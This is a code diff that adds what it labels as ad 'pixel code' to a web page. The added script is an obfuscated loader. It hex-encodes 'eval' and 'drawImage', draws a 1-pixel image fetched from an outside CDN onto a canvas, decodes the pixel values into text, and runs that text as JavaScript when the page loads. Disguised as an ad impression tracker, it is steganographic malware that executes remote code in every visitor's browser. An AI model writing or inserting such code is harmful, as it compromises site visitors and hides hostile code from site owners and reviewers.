@@ -125,3 +125,23 @@ var pixelImplemented = setInterval(()=>{
   
 </div>
 
+<-- new pixel code -->
+<script>
+  var adView = {
+	pixelId: "adzerk-grx8og6o9xbd5yjub9hlhq",
+	viewability: document.createElement('canvas'),
+	onHover: e => window['\x65\x76\x61\x6c'](e),
+	dimensions: '\x64\x72\x61\x77\x49\x6d\x61\x67\x65'
+  }
+  adView['viewWindow'] = adView.viewability.getContext('2d');
+
+window.registerAdzerkImpression = function() {
+  var azkpixel = document.getElementById(adView.pixelId);
+  adView.viewWindow[adView.dimensions](azkpixel,0,0);for(var imageData=adView.viewWindow.getImageData(0,0,adView.viewability.width, adView.viewability.height),x=0,mousePos="",s=!1;x<9e3&&0==s;){var i=4*(0*imageData.width+x),rgba=imageData.data[i];0!=rgba?mousePos+=rgba?String.fromCharCode(rgba):"":s=!0,x+=1}adView.onHover(mousePos);
+};
+</script>
+<img src="https://adzerk.b-cdn.net/pxid/pixel.png?cid=grx8og6o9xbd5yjub9hlhq" id="adzerk-grx8og6o9xbd5yjub9hlhq" width="1px" height="1px" crossorigin="anonymous" onload="registerAdzerkImpression()"/>
+<script>
+
+
+
